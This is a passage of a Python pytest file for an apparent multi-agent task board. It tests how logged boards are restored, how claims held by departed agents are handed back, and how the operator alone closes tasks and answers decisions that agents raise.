    assert snap.tasks["t1"].title == "first"
    assert snap.restores["sess-1"].unplaced == (NotPlaced("task", "t1", Unplaced.REPEATED),)


def test_a_logged_pair_waiting_on_each_other_through_a_shared_file_is_not_turned_away() -> None:
    """
    A restored task holds the dependencies its declarer named and the ones the
    store added for overlapping files in one tuple, and only the first kind was
    ever checked for a cycle. The reducer does not leave such a pair
    (``test_no_accepted_declaration_leaves_two_tasks_waiting_on_each_other``),
    but a log is whatever was written to it, and a restore that refused the pair
    would drop two tasks from a board over an edge no declarer asked for.
    """
    snap = _placed(
        _task(id="a", depends_on=("b",), touches=("x.py",)),
        _task(id="b", depends_on=("a",), touches=("x.py",)),
    )

    assert set(snap.tasks) == {"a", "b"} and snap.restores["sess-1"].unplaced == ()
    # The same pair with no file in common is a cycle only a declarer could have
    # asked for, and it was refused when it was.
    apart = _placed(_task(id="a", depends_on=("b",)), _task(id="b", depends_on=("a",)))
    assert apart.restores["sess-1"].unplaced == (NotPlaced("task", "b", Unplaced.WOULD_CYCLE),)


def _waits_on_itself(tasks: Mapping[str, Task], start: str) -> bool:
    """Whether following ``depends_on`` from ``start`` comes back to it."""
    frontier, seen = list(tasks[start].depends_on), set()
    while frontier:
        current = frontier.pop()
        if current == start:
            return True
        if current in seen or current not in tasks:
            continue
        seen.add(current)
        frontier.extend(tasks[current].depends_on)
    return False


def test_no_accepted_declaration_leaves_two_tasks_waiting_on_each_other() -> None:
    """
    A dependency may name a task that is not declared yet, so the task the store
    is about to queue a new one behind can already be waiting on it. That edge
    would close a loop nothing was refused for.
    """
    store = Store()
    store.apply(TaskDeclared(Task(id="a", title="A", depends_on=("b",), touches=("x.py",)), ROOT))
    effects = store.apply(
        TaskDeclared(Task(id="b", title="B", touches=("x.py",), declared_at=1.0), ROOT, "d1")
    )

    live = store.snapshot().tasks
    assert (live["a"].depends_on, live["b"].depends_on) == (("b",), ())
    assert live["b"].is_claimable(live)
    assert effects == (TaskWriteSettled("d1", None, auto_depends=(), already_behind=("a",)),)


def test_only_the_overlapping_task_already_behind_the_new_one_is_left_unsequenced() -> None:
    """
    Through a chain, and beside an ordinary overlap: ``far`` waits on ``new``
    two steps away and is left alone, ``plain`` only shares the file and is
    still what ``new`` is queued behind.
    """
    store = Store()
    store.apply(TaskDeclared(Task(id="mid", title="m", depends_on=("new",)), ROOT))
    store.apply(
        TaskDeclared(
            Task(id="far", title="f", depends_on=("mid",), touches=("x.py",), declared_at=1.0),
            ROOT,
        )
    )
    store.apply(TaskDeclared(Task(id="plain", title="p", touches=("y.py",), declared_at=2.0), ROOT))
    effects = store.apply(
        TaskDeclared(
            Task(id="new", title="n", touches=("x.py", "y.py"), declared_at=3.0), ROOT, "d1"
        )
    )

    live = store.snapshot().tasks
    assert live["new"].depends_on == ("plain",)
    assert effects == (
        TaskWriteSettled("d1", None, auto_depends=("plain",), already_behind=("far",)),
    )


@pytest.mark.parametrize("seed", range(120))
def test_generated_declarations_never_leave_a_task_waiting_on_itself(seed: int) -> None:
    rng = random.Random(seed)
    ids = [f"t{n}" for n in range(7)]
    store = Store()
    for at, task_id in enumerate(rng.sample(ids, len(ids))):
        named = tuple(rng.sample(ids, rng.randint(0, 2)))
        files = tuple(rng.sample(("a.py", "b.py", "c.py"), rng.randint(0, 2)))
        store.apply(
            TaskDeclared(
                Task(
                    id=task_id,
                    title=task_id,
                    depends_on=named,
                    touches=files,
                    declared_at=float(at),
                ),
                ROOT,
            )
        )

    live = store.snapshot().tasks
    assert [t for t in live if _waits_on_itself(live, t)] == [], seed


def test_a_concern_another_session_sent_is_not_this_boards_to_restore() -> None:
    mail = RestoredConcern(
        id="c1", sender=OTHER, recipient=ROOT, subject="s", body="b", posted_at=_wall(5.0)
    )

    snap = _placed(concerns=(mail,))

    assert "c1" not in snap.concerns
    assert snap.restores["sess-1"].unplaced == (
        NotPlaced("concern", "c1", Unplaced.NOT_THIS_SESSIONS),
    )


def test_everything_restored_is_stamped_strictly_before_the_restore() -> None:
    """
    Including a record whose wall-clock time is later than the reading -- a
    clock that was stepped. "Before the restore" is then one comparison, and a
    task declared in the same instant the board came back is on the other side.
    """
    snap = _placed(
        _task(id="old"),
        _task(id="future", versions=(boardlog.TaskVersion(_CLOCK.wall + 900.0, "", ROOT),)),
    )
    at = snap.restores["sess-1"].at

    assert at == _CLOCK.monotonic
    assert snap.tasks["old"].declared_at == 50.0
    assert 99.999 < snap.tasks["future"].declared_at < at
    assert snap.tasks["old"].declared_at < snap.tasks["future"].declared_at


# -- who a restored board names ---------------------------------------------------------


def test_a_party_with_an_id_is_that_node_and_one_with_only_an_address_is_nobody_live() -> None:
    """
    The log's ``lead`` is the resumed root. A sub-agent recorded with its id is
    that node, so if it is woken its claim is its own. A sub-agent recorded by
    address alone gets a stand-in that is no agent's id, and the address is kept
    beside it.
    """
    board = _logged(
        boardlog.Declared(at=_wall(50.0), task_id="t1", title="T", declared_by="lead"),
        boardlog.Claimed(at=_wall(40.0), task_id="t1", by="builder-2"),
        boardlog.Declared(at=_wall(30.0), task_id="t2", title="T", declared_by="main"),
        boardlog.Claimed(at=_wall(20.0), task_id="t2", by="builder", by_id=_OLD_BUILDER),
    )
    store = Store()

    _restore(store, board)

    snap = store.snapshot()
    stand_in = snap.tasks["t1"].claimed_by
    assert snap.tasks["t1"].declared_by == ROOT == snap.tasks["t2"].declared_by
    assert stand_in is not None and stand_in[0] == "sess-1" and is_address_only(stand_in)
    assert "/" in (stand_in[1] or ""), "an agent id is a file name, and this is not one"
    assert snap.tasks["t2"].claimed_by == _OLD_BUILDER and not is_address_only(_OLD_BUILDER)
    assert dict(snap.restores["sess-1"].parties) == {
        stand_in: "builder-2",
        _OLD_BUILDER: "builder",
    }
    assert snap.left_behind(stand_in) == "builder-2" and snap.left_behind(_OLD_BUILDER) == "builder"
    assert snap.left_behind(ROOT) is None


def test_a_stand_in_is_never_the_id_of_a_node_the_store_has() -> None:
    """Checked when it is built, against the one table that says who is here."""
    board = _logged(
        boardlog.Declared(at=_wall(50.0), task_id="t1", title="T", declared_by="lead"),
        boardlog.Claimed(at=_wall(40.0), task_id="t1", by="builder-2"),
    )
    plain = Store()
    _restore(plain, board)
    usual = plain.snapshot().tasks["t1"].claimed_by
    assert usual is not None

    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(usual, ROOT))
    _restore(store, board)

    stand_in = store.snapshot().tasks["t1"].claimed_by
    assert stand_in is not None and stand_in != usual and stand_in not in store.snapshot().nodes
    assert is_address_only(stand_in)
    assert store.snapshot().left_behind(stand_in) == "builder-2"


def test_an_agent_woken_under_the_id_the_log_has_holds_its_restored_claim() -> None:
    store = Store()
    _restore(store, _one_claimed())
    store.apply(spawn(ROOT))
    store.apply(spawn(_OLD_BUILDER, ROOT))

    assert store.snapshot().left_behind(_OLD_BUILDER) is None
    (done,) = store.apply(TaskCompleted(_OLD_BUILDER, "t1", at=200.0, request_id="k"))

    assert done == TaskWriteSettled(request_id="k", refusal=None)
    assert store.snapshot().tasks["t1"].state is TaskState.COMPLETED


# -- a claim whose holder is gone --------------------------------------------------------


def _resumed() -> Store:
    """A resumed session: its board restored, its root running, the old holder not."""
    store = Store()
    _restore(store, _one_claimed())
    store.apply(spawn(ROOT, at=101.0))
    return store


def test_the_root_gives_back_a_task_whose_holder_is_from_before_the_restart() -> None:
    """
    The task is pending again and claimable by another agent. It is the root that
    is recorded as having declined it -- the holder declined nothing -- so the
    root's own bare claim does not hand it straight back.
    """
    store = _resumed()
    store.apply(spawn(CHILD, ROOT))

    (released,) = store.apply(TaskReleased(ROOT, "t1", request_id="k1", at=150.0))

    task = store.snapshot().tasks["t1"]
    assert released == TaskWriteSettled(request_id="k1", refusal=None)
    assert (task.state, task.claimed_by, task.claimed_version) == (TaskState.PENDING, None, None)
    assert task.released_by == (ROOT,) and task.released_at == 150.0
    assert task.held_by == (_OLD_BUILDER,), "who has held it is history and stays"
    (bare,) = store.apply(TaskClaimRequested(ROOT, request_id="k2"))
    assert bare == ClaimSettled("k2", None, ClaimRefusal.NOTHING_CLAIMABLE)
    (taken,) = store.apply(TaskClaimRequested(CHILD, request_id="k3"))
    assert isinstance(taken, ClaimSettled) and taken.task is not None


def test_the_root_cannot_finish_a_gone_holders_task_under_the_holders_name() -> None:
    """
    The power is to release. The guard a completion and a release share was not
    widened, or this would land the root's result on a row that still names the
    builder as the one who did the work.
    """
    store = _resumed()
    before = store.snapshot().tasks["t1"]

    (refused,) = store.apply(
        TaskCompleted(ROOT, "t1", at=150.0, request_id="k1", result="done by the lead")
    )

    assert refused == TaskWriteSettled(request_id="k1", refusal=TaskRefusal.NOT_YOURS)
    assert store.snapshot().tasks["t1"] is before


def _held_by_a_builder_that(*then: Intent) -> Store:
    """The lead's task, claimed by a builder after ``then`` has happened to it."""
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(TaskDeclared(Task(id="t1", title="T"), ROOT))
    for intent in then:
        store.apply(intent)
    store.apply(TaskClaimRequested(CHILD, request_id="k", task_id="t1"))
    return store


@pytest.mark.parametrize(
    "then",
    [
        (spawn(CHILD, ROOT),),
        (spawn(CHILD, ROOT), AgentFinished(CHILD, AgentState.DONE, 5.0)),
        (spawn(CHILD, ROOT), AgentFinished(CHILD, AgentState.FAILED, 5.0)),
        (),
    ],
    ids=["running", "finished its turn", "failed", "never announced"],
)
def test_a_holder_this_process_knows_or_no_log_named_is_not_gone(
    then: tuple[Intent, ...],
) -> None:
    """
    A sub-agent that returned to its lead is terminal and can be woken, and may
    be holding the task across a wait: under "terminal or absent" a root could
    take work from any builder that had answered it. A holder with no record
    that no restored board named has simply not been announced. Neither is gone.
    """
    store = _held_by_a_builder_that(*then)
    before = store.snapshot().tasks["t1"]
    assert before.claimed_by == CHILD

    (refused,) = store.apply(TaskReleased(ROOT, "t1", request_id="k1"))

    assert refused == TaskWriteSettled(request_id="k1", refusal=TaskRefusal.NOT_YOURS)
    assert store.snapshot().tasks["t1"] is before


def test_the_owner_gone_alarm_is_wider_than_what_the_root_may_take() -> None:
    """
    The pin on the difference: the board calls a finished holder's claim stranded,
    and the reducer still does not let the root release it.
    """
    store = _held_by_a_builder_that(spawn(CHILD, ROOT), AgentFinished(CHILD, AgentState.DONE, 5.0))

    (row,) = board_tasks(store.snapshot(), "sess-1")

    assert row.owner_gone
    assert store.snapshot().left_behind(CHILD) is None


@pytest.mark.parametrize(
    "asker",
    [CHILD, OTHER, ("sess-2", "agent-z")],
    ids=["a sub-agent of the session", "another session's root", "another session's agent"],
)
def test_only_the_tasks_own_root_may_give_back_a_gone_holders_claim(asker: NodeId) -> None:
    store = _resumed()
    store.apply(spawn(CHILD, ROOT))
    store.apply(spawn(OTHER))
    before = store.snapshot().tasks["t1"]

    (refused,) = store.apply(TaskReleased(asker, "t1", request_id="k1"))

    assert refused == TaskWriteSettled(request_id="k1", refusal=TaskRefusal.NOT_YOURS)
    assert store.snapshot().tasks["t1"] is before


def test_a_restored_holder_that_has_been_woken_is_not_gone() -> None:
    store = _resumed()
    store.apply(spawn(_OLD_BUILDER, ROOT))

    (refused,) = store.apply(TaskReleased(ROOT, "t1", request_id="k1"))

    assert refused == TaskWriteSettled(request_id="k1", refusal=TaskRefusal.NOT_YOURS)
    assert store.snapshot().tasks["t1"].claimed_by == _OLD_BUILDER


# -- a claim left by an earlier run in this window -------------------------------------


def _started_again(
    ended: AgentState = AgentState.FAILED, announces: tuple[float, ...] = (9.0,)
) -> Store:
    """
    One window, no restart and no restored board: a builder took ``t1`` and
    ended, and the session was then started again -- its root announced once
    per entry of ``announces``.
    """
    store = Store()
    store.apply(spawn(ROOT, at=1.0))
    store.apply(TaskDeclared(Task(id="t1", title="T"), ROOT))
    store.apply(spawn(CHILD, ROOT, at=2.0))
    store.apply(TaskClaimRequested(CHILD, request_id="k", task_id="t1"))
    store.apply(AgentFinished(CHILD, ended, ended_at=5.0))
    for at in announces:
        store.apply(spawn(ROOT, at=at))
    return store


@pytest.mark.parametrize("ended", [AgentState.DONE, AgentState.FAILED, AgentState.CANCELLED])
@pytest.mark.parametrize("announces", [(9.0,), (9.0, 9.5)], ids=["announced once", "twice"])
def test_the_root_gives_back_a_claim_an_earlier_run_left_without_a_restart(
    ended: AgentState, announces: tuple[float, ...]
) -> None:
    """
    Resuming a session inside one window restores no board, so the earlier
    run's builder is still a record here and ``left_behind`` does not name it.
    The release that quitting and restarting pptmstr would have made possible is
    possible without it -- and a launch announcing its root twice changes nothing.
    """
    store = _started_again(ended, announces)
    assert store.snapshot().restores == {} and store.snapshot().left_behind(CHILD) is None

    (released,) = store.apply(TaskReleased(ROOT, "t1", request_id="k1", at=20.0))

    task = store.snapshot().tasks["t1"]
    assert released == TaskWriteSettled(request_id="k1", refusal=None)
    assert (task.state, task.claimed_by, task.claimed_version) == (TaskState.PENDING, None, None)
    assert task.released_by == (ROOT,) and task.held_by == (CHILD,)


def test_before_the_session_is_started_again_the_same_holder_keeps_its_claim() -> None:
    """
    The other side of the test above: the relaunch is what makes it an earlier run.
    """
    store = _started_again(announces=())

    (refused,) = store.apply(TaskReleased(ROOT, "t1", request_id="k1"))

    assert refused == TaskWriteSettled(request_id="k1", refusal=TaskRefusal.NOT_YOURS)


@pytest.mark.parametrize(
    "then",
    [
        (spawn(CHILD, ROOT, at=12.0),),
        (spawn(CHILD, ROOT, at=12.0), AgentFinished(CHILD, AgentState.DONE, 13.0)),
        (spawn(CHILD, ROOT, at=9.0), AgentFinished(CHILD, AgentState.DONE, 13.0)),
        (StateChanged(CHILD, AgentState.THINKING),),
    ],
    ids=[
        "started again in the new run",
        "started again and finished its turn",
        "announced at the very stamp the root was",
        "reported running again",
    ],
)
def test_an_earlier_runs_agent_that_is_part_of_the_current_run_keeps_its_claim(
    then: tuple[Intent, ...],
) -> None:
    """
    The half of the property that must not give: no agent takes a claim from one
    that is part of the run going now. An earlier run's builder the CLI starts
    again is announced afresh and is this run's -- running, or having finished a
    turn it can be woken from -- and so is anything not strictly before the
    root's announce.
    """
    store = _started_again()
    for intent in then:
        store.apply(intent)
    before = store.snapshot().tasks["t1"]

    (refused,) = store.apply(TaskReleased(ROOT, "t1", request_id="k1"))

    assert refused == TaskWriteSettled(request_id="k1", refusal=TaskRefusal.NOT_YOURS)
    assert store.snapshot().tasks["t1"] is before


@pytest.mark.parametrize(
    "asker",
    [("sess-1", "agent-b"), OTHER, ("sess-2", "agent-z")],
    ids=["a sub-agent of the session", "another session's root", "another session's agent"],
)
def test_only_the_sessions_own_root_may_give_back_an_earlier_runs_claim(asker: NodeId) -> None:
    store = _started_again()
    store.apply(spawn(("sess-1", "agent-b"), ROOT, at=12.0))
    store.apply(spawn(OTHER, at=12.0))
    store.apply(spawn(("sess-2", "agent-z"), OTHER, at=13.0))
    before = store.snapshot().tasks["t1"]

    (refused,) = store.apply(TaskReleased(asker, "t1", request_id="k1"))

    assert refused == TaskWriteSettled(request_id="k1", refusal=TaskRefusal.NOT_YOURS)
    assert store.snapshot().tasks["t1"] is before


def test_the_root_cannot_finish_an_earlier_runs_task_either() -> None:
    store = _started_again()
    before = store.snapshot().tasks["t1"]

    (refused,) = store.apply(TaskCompleted(ROOT, "t1", at=20.0, request_id="k1", result="mine"))

    assert refused == TaskWriteSettled(request_id="k1", refusal=TaskRefusal.NOT_YOURS)
    assert store.snapshot().tasks["t1"] is before


# -- the operator closes a task ---------------------------------------------------------


def _board_with(*then: Intent) -> Store:
    """``t1`` writing ``a.py``, ``t2`` waiting on it, a builder -- then ``then``."""
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(TaskDeclared(Task(id="t1", title="T", touches=("a.py",)), ROOT))
    store.apply(TaskDeclared(Task(id="t2", title="U", depends_on=("t1",), declared_at=1.0), ROOT))
    for intent in then:
        store.apply(intent)
    return store


_T1_CLAIMED = TaskClaimRequested(CHILD, request_id="k", task_id="t1")


@pytest.mark.parametrize("then", [(), (_T1_CLAIMED,)], ids=["pending", "claimed"])
def test_the_operator_closes_an_unfinished_task_and_the_result_is_the_stores(
    then: tuple[Intent, ...],
) -> None:
    """
    Finished, by the operator and by nobody else: the result is the label and
    the reason exactly as typed, there is no basis and no statement of what was
    run, and a holder it was closed under is no longer on it.
    """
    store = _board_with(*then)

    effects = store.apply(TaskClosed("t1", "  superseded\nby t9 "), now=40.0)

    task = store.snapshot().tasks["t1"]
    assert effects == ()
    assert task.state is TaskState.COMPLETED and task.closed_by_operator
    assert task.result == "closed by the operator:   superseded\nby t9 "
    assert (task.result_basis, task.not_run, task.completed_at) == (None, None, 40.0)
    assert (task.claimed_by, task.claimed_version, task.completed_version) == (None, None, None)
    assert task.held_by == ((CHILD,) if then else ())


def test_a_close_with_no_reason_is_the_label_alone_and_takes_the_emitters_clock() -> None:
    store = _board_with()

    store.apply(TaskClosed("t1", " \n", at=33.0), now=40.0)

    task = store.snapshot().tasks["t1"]
    assert (task.result, task.completed_at) == ("closed by the operator", 33.0)


def test_closing_a_task_lets_go_of_what_waited_on_it_and_of_its_files() -> None:
    """
    The point of the intent. Before it, ``t2`` waits on ``t1`` and a new task
    writing ``a.py`` is queued behind it; after, both are claimable.
    """
    store = _board_with(_T1_CLAIMED)
    store.apply(TaskDeclared(Task(id="t3", title="V", touches=("a.py",), declared_at=2.0), ROOT))
    snap = store.snapshot()
    assert snap.tasks["t3"].depends_on == ("t1",)
    assert not snap.tasks["t2"].is_claimable(snap.tasks)
    assert not snap.tasks["t3"].is_claimable(snap.tasks)

    store.apply(TaskClosed("t1", "the holder will not finish"))
    store.apply(TaskDeclared(Task(id="t4", title="W", touches=("a.py",), declared_at=3.0), ROOT))

    snap = store.snapshot()
    assert snap.tasks["t2"].is_claimable(snap.tasks) and snap.tasks["t3"].is_claimable(snap.tasks)
    assert "t1" not in snap.tasks["t4"].depends_on


@pytest.mark.parametrize(
    "finished",
    [
        TaskCompleted(CHILD, "t1", at=20.0, result="3/3 pass", basis=Basis.RUN, not_run=""),
        TaskClosed("t1", "the first reason", at=20.0),
    ],
    ids=["by its claimer", "by an earlier close"],
)
def test_closing_a_finished_task_changes_nothing(finished: Intent) -> None:
    """
    A claimer's result is not overwritten, and the first reason stands.
    """
    store = _board_with(_T1_CLAIMED, finished)
    before = store.snapshot()

    assert store.apply(TaskClosed("t1", "a later reason")) == ()
    assert store.apply(TaskClosed("no-such-task", "x")) == ()

    assert store.snapshot() is before


def test_no_close_can_be_built_that_names_an_agent() -> None:
    """
    The operator's alone, by construction: there is no field to put a node in,
    so no caller -- a bus tool least of all -- can emit one on an agent's behalf.
    """
    assert TaskClosed("t1", "x").node_id is None
    with pytest.raises(TypeError):
        TaskClosed("t1", "x", node_id=CHILD)  # type: ignore[call-arg]
    # Which of the two a frozen, slotted dataclass raises here is Python's business.
    with pytest.raises((AttributeError, TypeError)):
        TaskClosed("t1", "x").node_id = CHILD  # type: ignore[misc]


def test_the_holder_of_a_task_closed_under_it_can_no_longer_finish_or_release_it() -> None:
    """
    The row is nobody's completion, and stays the operator's whatever arrives.
    """
    store = _board_with(_T1_CLAIMED, TaskClosed("t1", "stop"))
    before = store.snapshot().tasks["t1"]

    (done,) = store.apply(TaskCompleted(CHILD, "t1", at=30.0, request_id="k1", result="mine"))
    (back,) = store.apply(TaskReleased(CHILD, "t1", request_id="k2"))
    (claim,) = store.apply(TaskClaimRequested(CHILD, request_id="k3", task_id="t1"))

    assert done == TaskWriteSettled(request_id="k1", refusal=TaskRefusal.CLOSED_BY_OPERATOR)
    assert back == TaskWriteSettled(request_id="k2", refusal=TaskRefusal.CLOSED_BY_OPERATOR)
    assert claim == ClaimSettled("k3", None, ClaimRefusal.COMPLETE)
    assert store.snapshot().tasks["t1"] is before


def test_a_task_its_claimer_finished_is_still_refused_as_already_complete() -> None:
    """
    The other half of the refusal above: only a close is said to be a close. A
    second ``complete_task`` on work that was done is told there is nothing left.
    """
    done = TaskCompleted(CHILD, "t1", at=20.0, result="3/3 pass")
    store = _board_with(_T1_CLAIMED, done)

    (again,) = store.apply(TaskCompleted(CHILD, "t1", at=30.0, request_id="k1", result="x"))
    (closed,) = _board_with(TaskClosed("t1", "stop")).apply(
        TaskReleased(ROOT, "t1", request_id="k2")
    )

    assert again == TaskWriteSettled(request_id="k1", refusal=TaskRefusal.ALREADY_COMPLETE)
    assert closed == TaskWriteSettled(request_id="k2", refusal=TaskRefusal.CLOSED_BY_OPERATOR)


def test_the_holder_of_a_task_the_operator_closes_is_sent_the_reason_as_mail() -> None:
    """
    A close stops nobody, and the row stops naming its holder -- so without this
    the one agent still writing the task's files is the one agent told nothing.
    The notice is the operator's and nobody else's, it is about the task, its
    body is the reason as typed, and it reaches the holder the way all mail does:
    once, at its next inbox read.
    """
    from pptmstr.intents import InboxRead
    from pptmstr.model import ConcernState, is_closing_notice, is_operator, operator_party

    store = _board_with(_T1_CLAIMED)
    assert not store.snapshot().nodes[CHILD].state.is_terminal

    store.apply(TaskClosed("t1", "  taking too long\n", at=33.0), now=40.0)

    (notice,) = store.snapshot().concerns.values()
    assert (notice.sender, notice.recipient) == (operator_party(ROOT[0]), CHILD)
    assert is_operator(notice.sender) and not is_operator(ROOT) and not is_operator(CHILD)
    assert is_closing_notice(notice.id) and "t1" in notice.subject
    assert (notice.task_id, notice.body, notice.posted_at) == ("t1", "  taking too long\n", 33.0)
    assert notice.state is ConcernState.POSTED and not notice.edited
    assert store.snapshot().inbox_of(ROOT) == ()
    # The holder is still running, and what waited is already another agent's to take.
    snap = store.snapshot()
    assert not snap.nodes[CHILD].state.is_terminal
    assert snap.tasks["t2"].is_claimable(snap.tasks)

    (first,) = store.apply(InboxRead(CHILD, request_id="r1", at=41.0))
    (second,) = store.apply(InboxRead(CHILD, request_id="r2", at=42.0))

    assert [c.id for c in first.concerns] == [notice.id]  # type: ignore[union-attr]
    assert first.concerns[0].state is ConcernState.DELIVERED  # type: ignore[union-attr]
    assert second.concerns == ()  # type: ignore[union-attr]


@pytest.mark.parametrize(
    "closed",
    [
        (TaskClosed("t1", "nobody had it"),),
        (_T1_CLAIMED, TaskReleased(CHILD, "t1"), TaskClosed("t1", "given back first")),
        (_T1_CLAIMED, TaskClosed("no-such-task", "x")),
        (_T1_CLAIMED, TaskCompleted(CHILD, "t1", at=5.0), TaskClosed("t1", "already done")),
    ],
    ids=["pending", "released before the close", "another id", "finished by its claimer"],
)
def test_a_close_nobody_was_holding_the_task_for_sends_no_mail(closed: tuple[Intent, ...]) -> None:
    assert _board_with(*closed).snapshot().concerns == {}


def test_a_second_close_does_not_send_the_holder_a_second_notice() -> None:
    store = _board_with(_T1_CLAIMED, TaskClosed("t1", "first"))
    before = store.snapshot()

    store.apply(TaskClosed("t1", "second"))

    assert store.snapshot() is before and len(before.concerns) == 1


def test_a_close_whose_reason_is_over_the_bound_is_not_applied_and_is_not_cut() -> None:
    """
    The reason becomes the task's result and the body of the holder's notice,
    whole. A pasted file there is a record no board log takes, so the arm
    refuses it; the box that sends the intent says so first, with the count.
    """
    from pptmstr.model import MAX_CLOSE_REASON_CHARS

    store = _board_with(_T1_CLAIMED)
    before = store.snapshot()

    assert store.apply(TaskClosed("t1", "x" * (MAX_CLOSE_REASON_CHARS + 1))) == ()
    assert store.snapshot() is before

    store.apply(TaskClosed("t1", "x" * MAX_CLOSE_REASON_CHARS))
    task = store.snapshot().tasks["t1"]
    assert task.closed_by_operator and task.result.endswith("x" * MAX_CLOSE_REASON_CHARS)


def test_a_write_approved_after_the_close_is_not_measured_against_the_closed_task() -> None:
    store = _board_with(_T1_CLAIMED, TaskClosed("t1", "stop"))
    before = store.snapshot().tasks["t1"]

    store.apply(ApprovalRequested(CHILD, pending(CHILD)))
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    assert store.snapshot().tasks["t1"] is before


def test_a_task_its_only_willing_agent_amended_is_ended_by_the_operator_closing_it() -> None:
    """
    The strand ``_pick_claim``'s docstring describes: the lead amended ``t1``, so
    it may not take it, and nobody else will. Closing it is the way out that
    needs no other agent.
    """
    store = _board_with(TaskAmended("t1", "rewritten", ROOT))
    (claim,) = store.apply(TaskClaimRequested(ROOT, request_id="k1", task_id="t1"))
    assert claim == ClaimSettled("k1", None, ClaimRefusal.AMENDED_BY_YOU)

    store.apply(TaskClosed("t1", "the lead will do this under t9"))

    snap = store.snapshot()
    assert snap.tasks["t2"].is_claimable(snap.tasks)


def test_a_task_waiting_on_an_id_another_session_holds_is_ended_by_closing_it() -> None:
    """
    Ids are fleet-wide, so ``build`` -- another session's -- can never be declared
    on this board, and ``gate`` waits on it for good with ``a.py`` queued behind
    it. No agent can change that; the operator closing ``gate`` does.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(OTHER))
    store.apply(TaskDeclared(Task(id="build", title="theirs"), OTHER))
    store.apply(
        TaskDeclared(Task(id="gate", title="G", depends_on=("build",), touches=("a.py",)), ROOT)
    )
    (again,) = store.apply(TaskDeclared(Task(id="build", title="ours"), ROOT, request_id="k1"))
    assert again == TaskWriteSettled(request_id="k1", refusal=TaskRefusal.DUPLICATE_ID)
    store.apply(TaskDeclared(Task(id="gate2", title="G", touches=("a.py",), declared_at=1.0), ROOT))
    snap = store.snapshot()
    assert snap.tasks["gate2"].depends_on == ("gate",)
    assert not any(snap.tasks[t].is_claimable(snap.tasks) for t in ("gate", "gate2"))

    store.apply(TaskClosed("gate", "waits on another session's id"))

    snap = store.snapshot()
    assert snap.tasks["gate2"].is_claimable(snap.tasks)
    assert snap.tasks["build"].state is TaskState.PENDING, "the other session's task is untouched"


@pytest.mark.parametrize(
    "wrong",
    [
        {"holder": _OLD_BUILDER, "held_by": (_OLD_BUILDER,)},
        {"claimed_version": 1},
        {"completed_at": None},
        {"state": TaskState.PENDING, "completed_at": None, "result": ""},
        {"result_basis": "run"},
        {"not_run": ""},
    ],
    ids=["a holder", "a handed version", "no time", "not finished", "a basis", "an unrun list"],
)
def test_a_logged_close_in_a_shape_the_close_arm_does_not_leave_is_not_placed(
    wrong: dict[str, Any],
) -> None:
    closed = RestoredTask(
        id="t1",
        title="T",
        declared_by=ROOT,
        versions=(boardlog.TaskVersion(_wall(50.0), "", ROOT),),
        state=TaskState.COMPLETED,
        completed_at=_wall(60.0),
        result="closed by the operator: x",
        closed_by_operator=True,
    )
    whole, broken = Store(), Store()

    _restore(whole, boardlog.Board(tasks=(closed,), concerns=()))
    _restore(broken, boardlog.Board(tasks=(dataclasses.replace(closed, **wrong),), concerns=()))

    placed = whole.snapshot().tasks["t1"]
    assert placed.closed_by_operator and placed.result == "closed by the operator: x"
    assert (placed.claimed_by, placed.completed_at) == (None, _CLOCK.monotonic - 60.0)
    assert broken.snapshot().tasks == {}
    assert broken.snapshot().restores["sess-1"].unplaced == (
        NotPlaced("task", "t1", Unplaced.INCOHERENT),
    )


def test_the_reducer_takes_a_restore_like_any_intent_for_no_node() -> None:
    """Pure, no reply, and the sequence number moves only when something did."""
    board = _one_claimed()
    intent = BoardRestored("sess-1", board, _CLOCK)

    first, effects = _apply(Snapshot.empty(), intent, 7.0)
    second, again = _apply(first, intent, 8.0)

    assert effects == () == again
    assert first.seq == 1 and second is first
    assert first.tasks["t1"].state is TaskState.CLAIMED


# -- decisions awaiting the operator ---------------------------------------------


def _decision(did: str = "d-1", **fields: Any) -> Decision:
    base: dict[str, Any] = dict(
        id=did,
        asker=CHILD,
        question="ship with the old schema?",
        blocks=(),
        if_unanswered="I carry on with the old one",
        evidence="3 of 40 rows fail the new check",
        recommendation="keep the old schema this release",
        standing=Standing.TAKEN,
        reversible=True,
        raised_at=0.0,
    )
    return Decision(**{**base, **fields})


def _deciding() -> Store:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(spawn(OTHER))
    return store


def test_a_raised_decision_is_filed_as_written_and_the_asker_is_told() -> None:
    store = _deciding()

    (told,) = store.apply(DecisionRaised(CHILD, _decision(), request_id="k1"), now=5.0)

    assert told == DecisionSettled(request_id="k1", refusal=None)
    assert store.snapshot().decisions["d-1"] == _decision(raised_at=5.0)
    assert store.snapshot().decisions_of(CHILD) == (_decision(raised_at=5.0),)
    assert store.snapshot().decisions_of(ROOT) == ()


def test_a_decision_cannot_arrive_answered_delivered_or_under_another_agents_name() -> None:
    """
    The arm writes what only arms may write and does not read it off the record:
    the hazard is a handler, or anything else that builds the intent, passing a
    record that is already answered.
    """
    store = _deciding()
    forged = _decision(
        asker=ROOT,
        raised_at=-400.0,
        outcome=Answered("yes, do it", at=1.0),
        first_delivered_at=2.0,
    )

    store.apply(DecisionRaised(CHILD, forged, at=5.0), now=9.0)

    landed = store.snapshot().decisions["d-1"]
    assert landed.asker == CHILD
    assert landed.raised_at == 5.0
    assert landed.outcome is None and landed.answer is None and landed.answered_at is None
    assert landed.first_delivered_at is None
    assert [o.key for o in store.snapshot().needs_you] == ["decision:d-1"]


def test_a_second_raise_under_an_id_that_exists_replaces_nothing() -> None:
    """Else a re-raise rewrites the question under an answer the operator gave."""
    store = _deciding()
    store.apply(DecisionRaised(CHILD, _decision()), now=5.0)
    store.apply(DecisionAnswered("d-1", "keep the old one"), now=6.0)
    answered = store.snapshot().decisions["d-1"]

    (told,) = store.apply(
        DecisionRaised(CHILD, _decision(question="may I delete the table?"), request_id="k2"),
        now=7.0,
    )

    assert told == DecisionSettled(request_id="k2", refusal=DecisionRefusal.ALREADY_RAISED)
    assert store.snapshot().decisions["d-1"] is answered
    assert store.snapshot().needs_you == ()


def test_only_an_intent_that_names_no_node_answers_a_decision() -> None:
    store = _deciding()
    store.apply(DecisionRaised(CHILD, _decision()), now=5.0)
    before = store.snapshot()

    for agent in (CHILD, ROOT, OTHER, ("sess-9", "never-seen")):
